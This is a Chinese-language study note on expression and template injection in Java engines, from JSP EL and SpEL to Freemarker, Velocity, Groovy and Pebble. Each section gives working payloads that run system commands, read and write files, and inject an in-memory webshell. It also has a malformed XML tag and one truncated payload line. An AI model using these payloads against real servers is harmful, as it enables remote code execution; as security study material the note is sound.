# 表达式注入漏洞

一般表达式注入漏洞都说的是EL类的，如`JSP EL、SpEL（Spring）、OGNL（Struts2）、MVEL、JBoss EL`等。但是模板注入漏洞最终也是由于表达式解析造成的，所以这里归入到表达式注入漏洞中一起讨论。Java常见的模板引擎包括：`Thymeleaf、Freemarker、Velocity、Groovy、JinJava、Pebble`等

表达式注入漏洞

- [JSP EL](#jsp_el)
- [SPEL](#spel)
- [OGNL](#ognl)

模板注入漏洞

- [Thymeleaf](#thymeleaf)
- [Freemarker](#freemarker)
- [Velocity](#velocity)
- [Groovy](#groovy)
- [JinJava](#jinjava)
- [Pebble](#pebble)

## jsp_el

EL（Expression Language，表达式语言），使表示层和JavaBean进行交互，用于JSF和JSP（JSP中直接嵌入形如`${}`）。官网参考：<https://docs.oracle.com/javaee/6/tutorial/doc/gjddd.html>

jsp的EL表达式可以执行JDK自带的方法，也可以执行自定义方法（前提是在jsp中引入对应的taglib）。如果想要禁用EL表达式，可以配置如下:

**web.xml中全局禁用EL**

```xml
<jsp-config>
 <jsp-property-group>
  <url-pattern>*.jsp</url-pattern>
  <el-ignored>true<el-ignored>
 </jsp-property-group>
</jsp-config>
```

**单个jsp页面禁用EL**

```
<%@ page isELIgnored="true"%>
```

**单条语句禁用EL（表达式前加\）**

```
\${expression}
```

EL注入的漏洞挖掘很简单，无非是找到一个jsp中的`${}`括号中变量可控的地方，核心在于poc的构造。表达式的基本形式`${对象.属性}或${对象.方法}`，那么在构造恶意poc时需要知道有哪些可用对象：JSP自带九大隐式对象（也称为预定义变量）；JDK内置的一些类。

jsp九大对象及描述如下，对象所具有的方法参照所实现接口具有的方法。其中，通过`pageContext`可以获取其他八个隐式对象。

```
request: HttpServletRequest接口的实例
response: HttpServletResponse 接口的实例
out: JspWriter类的实例，用于把结果输出至网页上
session: HttpSession类的实例
application: ServletContext类的实例，与应用上下文有关
config: ServletConfig类的实例
pageContext: PageContext类的实例，提供对JSP页面所有对象以及命名空间的访问
page: 类似于Java类中的this关键字
Exception: Exception类的对象，代表发生错误的JSP页面中对应的异常对象
```

借助这些对象可以尝试获取Web路径，获取输出流等。另外还常用隐式对象中的`attribute`属性做字符拼接。

```
# 获取请求头参数
${header}

# 获取WebRoot
${applicationScope}

# 获取Web路径
${pageContext.getSession().getServletContext().getClassLoader().getResource("")}
```

### POC

对EL进行利用，首先测试如下命令执行的payload。用反射来获取实例，如`''.class.forName`，但是有些场景下会抛出不支持访问`.class`，那么可以选择`getClass()`进行替代。

```
# 命令执行
${Runtime.getRuntime().exec("open -a Calculator")}
${''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'open -a Calculator')}
${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("open -a Calculator")}
${"".getClass().forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance(["open","-a","Calculator"]).start()}
```

还可能因为EL规范不完整（VarArgs未在J2EE EL中实现）而抛出`java.lang.IllegalArgumentException: wrong number of arguments`，这样就无法直接传参（也就无法直接调用静态方法Method.invoke或非默认构造函数Constructor.newInstance）。那么实例化类的唯一选择是使用`java.lang.Class.newInstance()`。`javax.script.ScriptEngineManager`就是满足这个条件的类之一

```
# ScriptEngineManager基本用法
${''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval('open -a Calculator')}
```

`ScriptEngineManager`需要根据引擎名调用对应引擎来执行命令，常用的JavaScript引擎在某些系统中不可用，需要利用如下语句查找可用引擎

```
# ScriptEngineManager查询可用引擎
${''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getClass().getMethod('getEngineFactories').invoke(''.getClass().forName('javax.script.ScriptEngineManager').newInstance())}
```

常用引擎及其引擎名称如下

```
BshScriptEngineFactory:      beanshell、bash、java
GroovyScriptEngineFactory:   groovy、Groovy
JexlScriptEngineFactory:     JEXL、jexl、Jexl、JEXL2、Jexl2、jexl2
PyScriptEngineFactory:       python、jython
NashornScriptEngineFactory:  nashorn、Nashorn、js、JS、JavaScript、javascript、ECMAScript、ecmascript
QuercusScriptEngineFactory:  quercus、php
RhinoScriptEngineFactory:    rhino、js、javascript、JavaScript、ECMAScript、ecmascript
```

针对不同引擎选用相应的payload，其他引擎payload类似但可能存在解析差异

```
# Rhino引擎payload
${''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('new java.lang.String(\"axisx\")')}
${''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('var x=new java.lang.ProcessBuilder; x.command(\"/bin/sh\",\"-c\",\"open -a Calculator\"); x.start()')}
${''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('java.lang.Runtime.getRuntime().exec(\"open -a Calculator\")')}
${''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('var s = [3];s[0] = \"/bin/sh\";s[1] = \"-c\";s[2] = \"ifconfig\";var p = java.lang.Runtime.getRuntime().exec(s);var sc = new java.util.Scanner(p.getInputStream(),\"GBK\").useDelimiter(\"\\\\A\");var result = sc.hasNext() ? sc.next() : \"\";sc.close();result;')}
```

关于poc构造，可以参考的文章：<https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html>

## spel

SpEL（Spring Expression Language）。官网参考：<https://docs.spring.io/spring-framework/docs/current/reference/html/core.html#expressions>

SpEL的基本用法

```java
ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression("'Hello World'.concat('!')");
String message = (String) exp.getValue();
```

SpEL在实际开发中的一些应用如下

**（1）预定义Bean的值**
xml配置如下

```
<bean id="numberGuess" class="org.spring.samples.NumberGuess">
    <property name="randomNumber" value="#{T(java.lang.Math).random()*100.0}"/>
</bean>
```

也可以在Bean的属性上方用`@Value`注解达到同样的效果

**（2）Spring Security**
在Spring Security中，有四个注解用于安全控制`@PreAuthorize、@PostAuthorize、@PreFilter、@PostFilter`，它们都接收SpEL

```
@PreAuthorize("hasPermission(#contact, 'admin')")
@PreAuthorize("hasAuthority('ROLE_DMIN') or #reqVo.sysUser.username == #userDetails.username")
```

**（3）Apache Camel**
Apache Camel是一个集成框架，集成了许多常见的组件，如Redis、Shiro等，也集成了SpEL，官方文档：<https://camel.apache.org/components/3.20.x/languages/spel-language.html>

Camel将SpEL用作DSL或XML配置，模板`#{}`

```xml
<route>
  <from uri="direct:foo"/>
  <filter>
    <spel>#{request.headers.foo == 'bar'}</spel>
    <to uri="direct:bar"/>
  </filter>
</route>
```

Spring相关组件出现的漏洞包括：CVE-2016-4977、CVE-2017-8046、CVE-2018-1260、CVE-2018-1273、CVE-2021-22053、CVE-2022-22947、CVE-2022-22963等，参考：<https://github.com/ax1sX/SpringSecurity>

### POC

SpEL的语言特性中有几点值得注意，（1）`{}`可以用来表达列表/键值对 （2）支持数组创建和数组调用，如`new String[]`、`members[0]` （3）`T`运算符用来指定类实例（除java.lang外，均需要采用全限定类名） （4）支持用`new`调用构造函数 （5）`#`用来引用变量，`$`用来引用属性 （6）可使用`#this`或`#root` （6）支持三元运算符作条件判断`xx ? true : false`

```
* Command Execution
T(Runtime).getRuntime().exec(\"open -a Calculator\")
new java.lang.ProcessBuilder({\"/bin/sh\",\"-c\",\"open -a Calculator\"}).start()
T(String).getClass().forName("java.lang.Runtime").getRuntime().exec("open -a Calculator")
T(String).getClass().forName("java.lang.Runtime").getMethod("exec",T(String[])).invoke(T(String).getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(T(String).getClass().forName("java.lang.Runtime")),new String[]{"/bin/sh","-c","open -a Calculator"})
T(javax.script.ScriptEngineManager).newInstance().getEngineByName("nashorn").eval("s=[3];s[0]='/bin/sh';s[1]='-c';s[2]='open -a Calculator';java.lang.Runtime.getRuntime().exec(s);")
T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval("s=[3];s[0]='/bin/sh';s[1]='-c';s[2]='open -a Calculator';java.lang.Runtime.getRuntime().exec(s);"),)
nstance().getEngineByName("JavaScript").eval(T(java.net.URLDecoder).decode("%6a...")),)

* Command Execution + Response
new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder("/bin/sh", "-c", "whoami").start().getInputStream(), "gbk")).readLine()
new java.util.Scanner(new java.lang.ProcessBuilder("/bin/sh", "-c", "ls", ".\\").start().getInputStream(), "GBK").useDelimiter("asdfasdf").next()

* Read or Write File
new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get(T(java.net.URI).create("file:/Users/axisx/Downloads/application.properties"))))
T(java.nio.file.Files).write(T(java.nio.file.Paths).get(T(java.net.URI).create("file:/C:/Users/1.txt")), 'hello'.getBytes(), T(java.nio.file.StandardOpenOption).WRITE)

* MemShell
#{T(org.springframework.cglib.core.ReflectUtils).defineClass('Memshell',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgAAA....'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()}
```

## ognl

OGNL（Object-Graph Navigation Language，对象图导航语言）。对象图，简单理解就是对象之间存在互相的引用。很多知名的项目都用到了OGNL，如Struts2、Spring Web Flow、Apache Click、Thymeleaf、FreeMarker等。官方网站：<https://commons.apache.org/proper/commons-ognl/>

OGNL的语法特性和SpEL很类似，有几个点较为特殊：（1）支持括号表达式（提高运算优先级），并且有自己的括号解析机制（2）用`@`调用静态方法和静态字段，`@class @method`，`@class @field`

OGNL POC参考：<https://github.com/ax1sX/SecurityList/blob/main/Struts2/POC%E8%A7%A3%E6%9E%90.md>

## thymeleaf

Thymeleaf引擎用于XML/XHTML/HTML5，支持表达式解析。Thymeleaf HTML模板和普通HTML一样。官方网站：<https://www.thymeleaf.org/doc/tutorials/2.1/usingthymeleaf.html>

一个简单的模板样例如下：

```
<p th:utext="#{home.welcome}">Welcome to our grocery store!</p>
```

Thymeleaf的表达式包括如下几种，变量表达式`${}`的解析实际执行的是OGNL表达式。如果是在Spring框架下，Thymeleaf会将OGNL替换为SpEL

```
# 2.0版本
${...} 变量表达式，2.0版本执行OGNL，在Spring框架下执行SpEL
*{...} 选择变量表达式，类似变量表达式，但只能用于指定对象
#{...} 消息表达式
@{...} 链接URL表达式，其中可以填入绝对或相对地址

# 3.0版本增加
~{...} 片段表达式，重用部分模板
```

Thymeleaf的一个重要特性：预处理，形如`__${expression}__`，在表达式执行之前，会先执行预处理并根据结果修改最终要执行的表达式。

漏洞Demo：<https://github.com/veracode-research/spring-view-manipulation/>

配合漏洞Demo的分析文章：<https://www.veracode.com/blog/secure-development/spring-view-manipulation-vulnerability>

真实环境Demo：<https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/>

## freemarker

Apache Freemarker，其模板是用FTL（Freemarker Template Language）编写的。FTL的核心元素：文本、插值（`${}`）、标签（`#`开头）等。

不同模板引擎的标签各有特色，freemarker的标签要以`#`开头，如`<#if>、<#list>、<#assign>`

```
<#if expression>...</#if> // 逻辑判断

<#list people as p
 ${p}
</#list> // 遍历集合

<#assign s = "Hello ${user}!"> // 定义变量
```

另外，在POC构造时，用到了freemarker的一个特性——内建函数，内建函数参考：<https://freemarker.apache.org/docs/ref_builtins_expert.html#ref_builtin_new>

常用的内建函数如下：

（1）new。 形如`全限定类名?new`，通过构造方法，创建实现`TemplateModel`接口的类的对象。

（2）eval。形如`"1+2"?eval`，

（3）api。 形如`value?api.someJavaMethod()`，访问类的方法。需要api_builtin_enabled配置设置为true，才可使用api方法。但很多版本下默认为false

Freemarker通过new可以创建实现`TemplateModel`接口的类的对象，由于不能任意创建对象，只能在`TemplateModel`接口实现类中寻找突破口，接口实现类：<https://freemarker.apache.org/docs/api/freemarker/template/TemplateModel.html>

其中一个实现类——`Execute`，官方描述是：赋予了FreeMarker执行外部命令的能力，将开启一个进程，并在模板中内联该进程发送到标准输出的任何内容。简单来说就是它可以执行系统命令。官方示例如下

```
SimpleHash root = new SimpleHash();
root.put( "exec", new freemarker.template.utility.Execute() );

${exec( "/usr/bin/ls" )}
```

<details>
  <summary>Execute类实现代码</summary>
  <pre>
  <code>
public class Execute implements TemplateMethodModel {
    public Object exec(List arguments) throws TemplateModelException {
            ...
            String aExecute = (String)((String)arguments.get(0));
            try {
                Process exec = Runtime.getRuntime().exec(aExecute);
                InputStream execOut = exec.getInputStream();
                try {
                    Reader execReader = new InputStreamReader(execOut);
                    char[] buffer = new char[1024];
                    for(int bytes_read = execReader.read(buffer); bytes_read > 0; bytes_read = execReader.read(buffer)) {
                        aOutputBuffer.append(buffer, 0, bytes_read);
                    }
                } finally {
                    execOut.close();
                }
            } ...
            return aOutputBuffer.toString();
        }
    }
}
  </code>
  </pre>
</details>

那么POC构造时就需要先利用`assign`标签定义一个Execute变量，然后表达式调用变量时传入参数。如下

```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
${"freemarker.template.utility.Execute"?new()("id")}
[="freemarker.template.utility.Execute"?new()("id")]
```

关于更复杂的poc构造，有一篇不错的文章：<https://ackcent.com/in-depth-freemarker-template-injection/>

Freemarker SSTI的一个偏向于黑盒测试的实际漏洞CVE-2021-25770：<https://www.synacktiv.com/en/publications/exploiting-cve-2021-25770-a-server-side-template-injection-in-youtrack.html>

Freemarker SSTI的另外两个漏洞：CVE-2022-22954（VMware workspace one access）和CVE-2020-13445（Liferay Portal）可以看看。

## velocity

Velocity，其模板是用VTL（Velocity Template Language）编写的，将内容动态地插入到网页中，官方网址：<https://velocity.apache.org/engine/2.3/user-guide.html>

一个简单的模板样例如下：`#`后跟指令，`$`代表变量。set指令用于设置引用的值

```
#set($a = "Velocity")
$a

#if($foo)
  <strong>Velocity!</strong>
#end

#foreach($customer in $customerList)
    <tr><td>$customer.Name</td></tr>
#end

#include("one.txt")
#parse("me.vm")
```

Velocity并没有专门提及表达式相关内容，在官方文档查找自带的一些对象时，有个目录叫做工具，包含通用工具、视图工具等：<https://velocity.apache.org/tools/3.1/tools-summary.html>

通用工具中包含了ClassTool`$class`、FieldTool`$field`等。这不禁联想是否满足反射获取对象，进而构造POC。想要调用方法首先要获取对象，在查看官方文档的过程中，ClassTool包含如下一条，可以返回指定类或对象的实例

```
$class.inspect(class/object/string): returns a new ClassTool instance that inspects the specified class or object
```

POC构造：

```
$class.inspect("java.lang.Runtime").type.getRuntime().exec("sleep 5").waitFor()

#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

## groovy

Groovy的诞生是作为Java的补充语言而创建的脚本语言，所以语法与Java极其类似，但借鉴了动态语言Ruby、Python、Smalltalk。关于它的一篇论文《A History of the Groovy Programming Language》：<https://dl.acm.org/doi/pdf/10.1145/3386326>

Groovy的表达式样式也是`${}`。翻看说明目录的时候除了介绍常用的语法（类似Java）发现了一个名为working with IO的工具包：<https://docs.groovy-lang.org/latest/html/documentation/#process-management> 。包括读写文件、执行外部进程等工具。

（1）执行外部进程。Groovy提供了`'字符串'.execute()`的方式来调用外部进程，那么可以利用此方式来弹计算器

```
${"calc.exe".execute()}
```

（2）读写文件。Groovy支持`new File(baseDir, 'xx.txt')`的方式来操作文件。所以可以采用如下的方式来读取文件或创建文件

```
${String x = new File('/path/to/file').getText('UTF-8')}
${new File("C:\Temp\FileName.txt").createNewFile();}
```

说明文档中有很大的篇幅说明了Groovy中的元编程部分。一般编程操作的是数据，而元编程操作的是代码，简单理解就是用代码来生成代码。元编程分为运行时和编译时。编译时元编程会在编译时生成代码，转换成AST。不同的注解能生成不同的方法，例如`@ToString`能将类中属性编程字符串，`@EqualsAndHashCode`能自动生成equals和hashcode方法。

注解也有很多种，代表设计模式的注解（`@DelegateAST`委托设计模式、`@Singleton`单例设计模式）；日志框架类注解（`@groovy.util.logging.Log`）；并发模式注解（`@groovy.transform.Synchronized`）；测试用例相关注解（`@groovy.transform.ASTTest`）等

测试用例注解中的`@groovy.transform.ASTTest`，这是Orange在绕过Groovy沙箱时用到的技巧。该注解有两个参数`phase`和`value`。对于`value`官方给出的解释是`value: the code which will be executed once the phase is reached, on the annotated node`。也就是被标记为`@ASTTest`的节点，其value的代码会被执行。从而构造出了如下POC

```
${@ASTTest(value={assert java.lang.Runtime.getRuntime().exec("whoami")})
def x}

${new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x") }
```

在Groovy中有很多保留关键字，如`new、def`，def关键字参考python，用于定义方法，在Groovy中还可以定义变量。new关键字则是创建类对象。

关于Groovy的POC可以参考：<https://security.humanativaspa.it/groovy-template-engine-exploitation-notes-from-a-real-case-scenario/>

关于Groovy POC的研究可以参考Orange研究Jenkins时的思路：<https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/>

## jinjava

JinJava的语法是基于django的，呈现jinja模板。所以样式如`{{}}`。官网：<https://github.com/HubSpot/jinjava>

POC和EL的类似

```
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
```

## pebble

Pebble是一个受Twig启发的Java模板引擎，语法类似python的Jinja模板引擎。主要有两种形式的分隔符`{{ ... }}`和`{% ... %}`。前者用于输出表达式结果，后者用于流程控制。流程控制包含很多内置标签：`set、autoescape、block、flush、filter、for、from、if、import、include`等，参考：<https://pebbletemplates.io/wiki/tag/set/>

set标签用于定义变量，POC参考文章：<https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/>

```
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}

// Java 9+
{% set cmd = 'id' %}
{% set bytes = (1).TYPE
     .forName('java.lang.Runtime')
     .methods[6]
     .invoke(null,null)
     .exec(cmd)
     .inputStream
     .readAllBytes() %}
{{ (1).TYPE
     .forName('java.lang.String')
     .constructors[0]
     .newInstance(([bytes]).toArray()) }}
```

有个项目整理了很多表达式注入相关的payload，但是用于实战还要根据上述思路进行更改，搭配着看吧：<https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#expression-language-el---basic-injection>

另外，关于模板注入，基础用法可以看这篇： <https://portswigger.net/research/server-side-template-injection>

模板注入的沙盒绕过看这篇，文中提出了很多思路，针对Freemarker、Velocity、JinJava也给出了很多的绕过POC：<https://media.defcon.org/DEF%20CON%2028/DEF%20CON%20Safe%20Mode%20presentations/DEF%20CON%20Safe%20Mode%20-%20Alvaro%20Mun%CC%83oz%20and%20Oleksandr%20Mirosh%20-%20Room%20For%20Escape%20Scribbling%20Outside%20The%20Lines%20Of%20Template%20Security.pdf>
